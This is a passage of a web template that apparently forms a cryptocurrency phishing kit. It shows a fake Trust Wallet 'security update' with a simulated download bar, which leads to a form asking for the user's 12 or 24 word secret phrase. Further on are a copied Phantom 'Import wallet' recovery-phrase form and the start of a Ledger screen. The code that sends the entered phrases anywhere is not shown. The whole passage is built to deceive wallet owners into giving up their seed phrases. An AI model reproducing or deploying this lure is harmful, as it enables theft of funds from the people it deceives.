                d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z"
                fill="#48FF91"
              ></path>
              <path
                d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z"
                fill="#48FF91"
              ></path>
              <path
                d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z"
                fill="#48FF91"
              ></path>
            </g>
            <defs>
              <linearGradient
                id="paint0_linear_26161_83707"
                x1="29.1518"
                y1="94.7238"
                x2="54.3898"
                y2="3.84876"
                gradientUnits="userSpaceOnUse"
              >
                <stop offset="0.26" stop-color="#48FF91"></stop>
                <stop offset="0.66" stop-color="#0094FF"></stop>
                <stop offset="0.8" stop-color="#0038FF"></stop>
                <stop offset="0.89" stop-color="#0500FF"></stop>
              </linearGradient>
              <clipPath id="clip0_26161_83707">
                <rect width="61.1691" height="86.0768" fill="white"></rect>
              </clipPath>
            </defs>
          </svg>
        </div>
      </div>
      <div :class="pageManager == '2' ? 'trustupdata' : 'scwtw-hidden'">
        <div class="trustupdatacon">
          <div class="scwtw-mt-12">
            <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
              <div>
                <svg
                  class="scwtw-h-q scwtw-w-full"
                  fill="none"
                  width="62"
                  height="87"
                  viewBox="0 0 62 87"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g clip-path="url(#clip0_26161_837071)">
                    <path
                      d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z"
                      fill="url(#paint0_linear_26161_837071)"
                    ></path>
                    <path
                      d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z"
                      fill="#48FF91"
                    ></path>
                  </g>
                  <defs>
                    <linearGradient
                      id="paint0_linear_26161_837071"
                      x1="29.1518"
                      y1="94.7238"
                      x2="54.3898"
                      y2="3.84876"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop offset="0.26" stop-color="#48FF91"></stop>
                      <stop offset="0.66" stop-color="#0094FF"></stop>
                      <stop offset="0.8" stop-color="#0038FF"></stop>
                      <stop offset="0.89" stop-color="#0500FF"></stop>
                    </linearGradient>
                    <clipPath id="clip0_26161_837071">
                      <rect
                        width="61.1691"
                        height="86.0768"
                        fill="white"
                      ></rect>
                    </clipPath>
                  </defs>
                </svg>
              </div>
            </div>
          </div>
          <div class="trusttxtbox">
            <div>
              <h3 class="trusttit">Update Available</h3>
            </div>
            <div class="scwtw-px-4">
              <p class="trusttxt">Version 2.31.2</p>
            </div>
          </div>
          <div class="trustpresentbox">
            <div class="trustpresent">
              <p class="trustpresenttxt">
                Important scheduled update with security improvements. We
                recommend installing it now.
              </p>
            </div>
          </div>
          <div class="trustpresentbox">
            <div class="trustpresentulbox">
              <ul class="trustpresentul">
                <li class="trustpresentli">
                  Enhanced multi-chain support and performance
                </li>
                <li class="trustpresentli">Improved security system</li>
                <li class="trustpresentli">
                  Fixed network information display
                </li>
                <li class="trustpresentli">
                  Better transaction signing experience
                </li>
              </ul>
            </div>
          </div>
          <div class="trustupdatabutbox">
            <div class="scwtw-w-full">
              <button
                @click="pageSwitch('3')"
                class="trustupdatabut"
                type="button"
              >
                Update
              </button>
            </div>
          </div>
          <div class="trusthelpbox">
            <p class="trusthelptxt">
              Need help?
              <a
                href="https://href.li/?https://support.trustwallet.com/en/support/home"
                target="_blank"
                class="trusthelplink"
                >Contact Us</a
              >
            </p>
          </div>
        </div>
      </div>
      <div :class="pageManager == '3' ? 'trustupdata' : 'scwtw-hidden'">
        <div class="trustupdatacon">
          <div class="scwtw-mt-12">
            <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
              <div>
                <svg
                  class="scwtw-h-q scwtw-w-full"
                  fill="none"
                  width="62"
                  height="87"
                  viewBox="0 0 62 87"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g clip-path="url(#clip0_26161_8370711)">
                    <path
                      d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z"
                      fill="url(#paint0_linear_26161_8370711)"
                    ></path>
                    <path
                      d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z"
                      fill="#48FF91"
                    ></path>
                  </g>
                  <defs>
                    <linearGradient
                      id="paint0_linear_26161_8370711"
                      x1="29.1518"
                      y1="94.7238"
                      x2="54.3898"
                      y2="3.84876"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop offset="0.26" stop-color="#48FF91"></stop>
                      <stop offset="0.66" stop-color="#0094FF"></stop>
                      <stop offset="0.8" stop-color="#0038FF"></stop>
                      <stop offset="0.89" stop-color="#0500FF"></stop>
                    </linearGradient>
                    <clipPath id="clip0_26161_8370711">
                      <rect
                        width="61.1691"
                        height="86.0768"
                        fill="white"
                      ></rect>
                    </clipPath>
                  </defs>
                </svg>
              </div>
            </div>
          </div>
          <div class="trusttxtbox">
            <div>
              <h3 class="trusttit">Updating</h3>
            </div>
            <div class="scwtw-px-4">
              <p class="trusttxt">
                Please wait while we update to version 2.31.2
              </p>
            </div>
          </div>
          <div class="trustprogressbox">
            <div class="trustprogressshadow">
              <div
                class="trustprogressbg"
                :style="{ width: one_progress + '%' }"
              ></div>
            </div>
            <div class="trustprogresstxtbox">
              <p class="trustprogresstxtl">Downloading update...</p>
              <p class="trustprogresstxtr">{{ Math.trunc(one_progress) }}%</p>
            </div>
          </div>
          <div class="trusthintbox">
            <p class="trusthint">
              This may take a few moments. Please do not close this window.
            </p>
          </div>
        </div>
      </div>
      <div :class="pageManager == '4' ? 'trustupdata' : 'scwtw-hidden'">
        <div class="trustupdatacon">
          <div class="scwtw-mt-5 scwtw-w-full">
            <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
              <div>
                <svg
                  class="scwtw-h-q scwtw-w-full"
                  fill="none"
                  width="62"
                  height="87"
                  viewBox="0 0 62 87"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g clip-path="url(#clip0_26161_8370712)">
                    <path
                      d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z"
                      fill="url(#paint0_linear_26161_8370712)"
                    ></path>
                    <path
                      d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z"
                      fill="#48FF91"
                    ></path>
                    <path
                      d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z"
                      fill="#48FF91"
                    ></path>
                  </g>
                  <defs>
                    <linearGradient
                      id="paint0_linear_26161_8370712"
                      x1="29.1518"
                      y1="94.7238"
                      x2="54.3898"
                      y2="3.84876"
                      gradientUnits="userSpaceOnUse"
                    >
                      <stop offset="0.26" stop-color="#48FF91"></stop>
                      <stop offset="0.66" stop-color="#0094FF"></stop>
                      <stop offset="0.8" stop-color="#0038FF"></stop>
                      <stop offset="0.89" stop-color="#0500FF"></stop>
                    </linearGradient>
                    <clipPath id="clip0_26161_8370712">
                      <rect
                        width="61.1691"
                        height="86.0768"
                        fill="white"
                      ></rect>
                    </clipPath>
                  </defs>
                </svg>
              </div>
            </div>
            <div class="trustselectbox">
              <div>
                <h3 class="trustselecttit">Import with Secret Phrase</h3>
              </div>
              <div class="scwtw-w-full scwtw-px-4">
                <select v-model="selectedOption" class="trustselect">
                  <option value="12" selected="">
                    I have a 12 word Secret Phrase
                  </option>
                  <option value="24">I have a 24 word Secret Phrase</option>
                </select>
              </div>
            </div>
            <div class="trustinputsbox">
              <div class="trustinputs">
                <div
                  v-for="(item, i) in visibleInputs"
                  :key="i"
                  class="trustinputitem"
                >
                  <p class="trustindextxt">{{ i + 1 }}.</p>
                  <input
                    :class="
                      item.type
                        ? 'trustimportinput no-auto'
                        : 'trustimportinput no-autofill-pwd'
                    "
                    v-model="item.value"
                    id="importwalletinput"
                    type="text"
                    :placeholder="'Word #' + (i + 1)"
                  />
                  <button @click="toggleType(i)" class="trusteyesvgbox">
                    <svg
                      :class="
                        item.type ? 'scwtw-hidden svgeyecolor' : ' svgeyecolor'
                      "
                      fill="none"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        fill-rule="evenodd"
                        clip-rule="evenodd"
                        d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                        fill="currentColor"
                      ></path>
                      <path
                        d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                        fill="currentColor"
                      ></path>
                    </svg>
                    <svg
                      :class="
                        item.type ? 'svgeyecolor' : 'scwtw-hidden svgeyecolor'
                      "
                      fill="none"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                        fill="currentColor"
                      ></path>
                      <path
                        fill-rule="evenodd"
                        clip-rule="evenodd"
                        d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                        fill="currentColor"
                      ></path>
                    </svg>
                  </button>
                </div>
              </div>
            </div>
            <div :class="errormessage ? 'trusterrorbox' : 'scwtw-hidden'">
              <div class="trusterrortxtb">
                <div style="height: 24px">
                  <svg
                    class="trusterrorsvg"
                    fill="none"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                      d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21ZM10.75 15.5V18H13.25V15.5H10.75ZM10.75 6V13H13.25V6H10.75Z"
                      fill="currentColor"
                    ></path>
                  </svg>
                </div>
                <div>
                  <span class="trusterrortxt">Invalid Secret Phrase</span>
                </div>
              </div>
            </div>
          </div>
          <div
            class="scwtw-w-full scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4 scwtw-px-4"
          >
            <div class="scwtw-w-full">
              <button
                @click="walletsswitch('Trust', false)"
                class="scwtw-w-full trustclosebut"
                type="button"
              >
                Back
              </button>
            </div>
            <div class="scwtw-w-full">
              <button
                class="scwtw-w-full trustimportbut"
                type="button"
                @click="confirm()"
                :disabled="!isConfirmEnabled"
              >
                Next
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- phantom -->
  <div :class="Phantomisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'">
    <div
      @click="walletsswitch('Phantom', false)"
      class="walletsbg zindexh1"
    ></div>
    <div
      :class="
        Phantomisshow
          ? 'Metamaskbox phantombox Metamaskboxshow'
          : 'Metamaskbox phantombox'
      "
    >
      <div :class="doublePage == '1' ? 'phantomone' : 'scwtw-hidden'">
        <div>
          <svg
            class="scwtw-h-se scwtw-w-full ghost-svg"
            width="593"
            height="493"
            viewBox="0 0 593 493"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z"
              fill="#FFFDF8"
            ></path>
          </svg>
        </div>
        <div class="scwtw-mt-8">
          <p class="phantomonetxt">BooOooOo...</p>
        </div>
      </div>
      <div :class="doublePage == '2' ? 'phantomimport' : 'scwtw-hidden'">
        <div class="phantomimportheade">
          <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
            <button
              @click="walletsswitch('Phantom', false)"
              type="button"
              class="phantomclosebutton"
            >
              <svg
                class="phantomclosesvg"
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <circle cx="12" cy="12" r="10"></circle>
                <path d="m15 9-6 6"></path>
                <path d="m9 9 6 6"></path>
              </svg>
            </button>
          </div>
          <div>
            <svg width="94" height="103" viewBox="0 0 478 103">
              <path
                fill="#666666"
                d="M0 102.895h17.97V85.222c0-8.295-.718-11.42-4.911-19.836l2.276-1.203C21.445 78.49 30.07 83.66 38.937 83.66c14.257 0 25.638-12.503 25.638-31.859 0-18.514-10.423-32.1-25.399-32.1-8.865 0-17.73 5.05-23.841 19.477l-2.276-1.202c2.875-5.771 4.912-11.181 4.912-16.35H0v81.27ZM17.97 51.68c0-7.934 5.991-16.71 14.857-16.71 7.188 0 13.058 5.89 13.058 16.59 0 10.58-5.63 16.831-13.178 16.831-8.387 0-14.736-8.536-14.736-16.71ZM71.135 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.147 4.208 8.147 14.668v31.979h17.97V46.871c0-18.995-6.828-27.17-19.887-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832V.826h-17.97v80.91ZM156.582 83.66c11.621 0 18.45-7.694 23.601-17.553l2.157 1.082c-2.277 4.689-4.433 10.099-4.433 14.547h17.612v-32.7c0-19.477-8.147-29.335-27.196-29.335-18.69 0-27.915 9.377-29.712 19.236l17.252 3.005c.599-5.17 4.792-8.656 11.501-8.656 6.71 0 10.543 3.366 10.543 7.454 0 4.088-3.953 6.011-14.496 6.131-15.575.24-27.076 5.891-27.076 17.914 0 9.858 7.787 18.874 20.247 18.874Zm-2.396-20.078c0-9.498 15.095-2.885 23.362-10.218v2.163c0 8.536-7.548 14.788-15.096 14.788-3.953 0-8.266-1.683-8.266-6.733ZM202.64 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.146 4.208 8.146 14.668v31.979h17.972V46.871c0-18.995-6.829-27.17-19.888-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832h-17.97v60.112ZM309.688 81.977V67.069c-3.834 1.322-14.496 3.606-14.496-5.17V36.051h14.376V21.624h-14.376V5.514l-18.091 5.41v10.7h-10.782v14.427h10.782l.12 27.291c0 20.077 17.851 22.963 32.467 18.635ZM346.192 83.66c18.211 0 32.108-13.946 32.108-32.1 0-18.034-13.897-31.86-32.108-31.86-18.21 0-32.227 13.826-32.227 31.86 0 18.154 14.017 32.1 32.227 32.1Zm-13.657-31.98c0-9.978 5.631-16.951 13.657-16.951 8.027 0 13.538 6.973 13.538 16.951 0 9.979-5.511 16.952-13.538 16.952-8.026 0-13.657-6.973-13.657-16.952ZM383.868 81.736h17.968v-21.16c0-15.508 4.913-25.487 12.82-25.487 5.154 0 6.83 4.088 6.83 14.668v31.979h17.973v-21.16c0-14.547 5.27-25.487 12.82-25.487 5.027 0 6.824 4.69 6.824 14.668v31.979h17.974V46.871c0-19.115-6.232-27.17-18.452-27.17-12.698 0-17.248 9.017-21.682 20.077l-2.16-1.082c4.198-12.623-4.912-18.995-13.896-18.995-11.858 0-16.171 9.017-20.963 19.957l-2.159-1.202c2.994-6.733 4.071-10.82 4.071-16.832h-17.968v60.112Z"
              ></path>
            </svg>
          </div>
          <div>
            <a
              href="https://href.li/?https://help.phantom.com/hc/en-us"
              target="_blank"
            >
              <svg
                class="phantomimportlink"
                width="15"
                viewBox="0 0 15 15"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z"
                ></path>
              </svg>
            </a>
          </div>
        </div>
        <div class="scwtw-mt-6">
          <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
            <div>
              <svg
                class="scwtw-h-b scwtw-w-full"
                width="593"
                height="493"
                viewBox="0 0 593 493"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z"
                  fill="#FFFDF8"
                ></path>
              </svg>
            </div>
          </div>
          <div class="phantomimportbox">
            <div>
              <h3 class="phantomimporttit">Import wallet</h3>
            </div>
            <div>
              <p class="phantomimporttxt">
                Import an existing wallet with your 12 or 24-word recovery
                phrase.
              </p>
            </div>
          </div>
          <div class="phantominputsbox">
            <div class="phantominputs">
              <div
                v-for="(item, i) in visibleInputs"
                :key="i"
                class="scwtw-relative"
              >
                <p class="phantomitemi">{{ i + 1 }}.</p>
                <input
                  class="phanyomiteminput"
                  v-model="item.value"
                  type="text"
                  data-invalid="false"
                />
              </div>
            </div>
          </div>
          <div :class="errormessage ? 'phantomerrorbox' : 'scwtw-hidden'">
            <p class="phantomerror">
              <svg
                class="phantomerrorsvg"
                width="12"
                height="12"
                viewBox="0 0 30 30"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle cx="15" cy="15" r="14" fill="#111111"></circle>
                <path
                  d="M25.0182 25.0176C30.5503 19.4855 30.5503 10.5146 25.0182 4.98245C19.4861 -0.549652 10.5152 -0.549652 4.98306 4.98245C-0.549041 10.5146 -0.549041 19.4855 4.98306 25.0176C10.5152 30.5497 19.4861 30.5497 25.0182 25.0176ZM13.4158 8.1522C13.7746 7.37471 14.6119 6.95607 15.4492 7.16539C16.2566 7.37471 16.7948 8.1522 16.735 9.01939C16.7051 9.58755 16.6752 10.1258 16.6453 10.694C16.5257 12.7872 16.4061 14.8804 16.3164 16.9438C16.2865 17.6315 15.7183 18.1698 15.0306 18.1698C14.3129 18.1698 13.7746 17.6315 13.7447 16.8839C13.7148 16.4653 13.7148 16.0467 13.6849 15.628C13.5952 14.2824 13.5354 12.9367 13.4457 11.5612C13.3859 10.694 13.356 9.82678 13.2962 8.95958C13.2663 8.72036 13.2962 8.42132 13.4158 8.1522ZM15.0007 19.3958C15.9576 19.3958 16.735 20.1733 16.7649 21.1302C16.7649 22.0871 15.9875 22.8646 15.0306 22.8646C14.1036 22.8646 13.2962 22.0871 13.2962 21.1601C13.2663 20.2032 14.0437 19.3958 15.0007 19.3958Z"
                  fill="#EB3742"
                ></path>
              </svg>
              <span class="phantomerrortxt"
                >Words are incorrect or misspelled</span
              >
            </p>
          </div>
        </div>
        <div class="phantomendbox">
          <div class="scwtw-mb-1d5">
            <button
              @click="selectedOptionh('12')"
              :class="selectedOption == '24' ? 'inputsqhbut' : 'scwtw-hidden'"
            >
              I have a 24-word recovery phrase
            </button>
            <button
              @click="selectedOptionh('24')"
              :class="selectedOption == '12' ? 'inputsqhbut' : 'scwtw-hidden'"
            >
              I have a 12-word recovery phrase
            </button>
          </div>
          <div class="scwtw-w-full">
            <button
              class="phantomimportbut"
              @click="confirm()"
              :disabled="!isConfirmEnabled"
            >
              Import Wallet
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- ledger -->
  <div :class="Ledgerisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'">
    <div
      @click="walletsswitch('Ledger', false)"
      class="walletsbg zindexh1"
    ></div>
    <div :class="Ledgerisshow ? 'Ledgerbox ledgerboxshow' : 'Ledgerbox'">
      <div :class="doublePage == '1' ? 'ledgerone' : 'scwtw-hidden'">
        <div class="ledgeronelogobox">
          <div class="ledgeronelogob">
            <div class="scwtw-relative">
              <div class="ledgeronelogok">
                <svg
                  class="ledgeronelogo"
                  width="100"
                  height="100"
